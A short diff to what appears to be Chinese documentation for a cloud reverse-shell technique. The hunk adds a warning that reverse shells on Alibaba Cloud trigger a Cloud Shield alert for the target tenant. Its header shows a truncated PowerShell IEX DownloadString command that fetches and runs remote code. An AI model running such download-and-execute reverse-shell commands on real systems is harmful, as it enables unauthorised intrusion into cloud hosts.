@@ -42,6 +42,12 @@ powershell IEX (New-Object System.Net.Webclient).DownloadString('https://ghproxy
 >
 > 因为反弹 Shell 需要命令保持一直处于执行状态，所以在上面的图片里可以看到提示命令执行超时。
 
+::: warning 注意
+
+在阿里云下反弹 Shell ，目标租户将收到阿里云的云盾告警消息。
+
+:::
+
 <Vssue />
 
 <script>
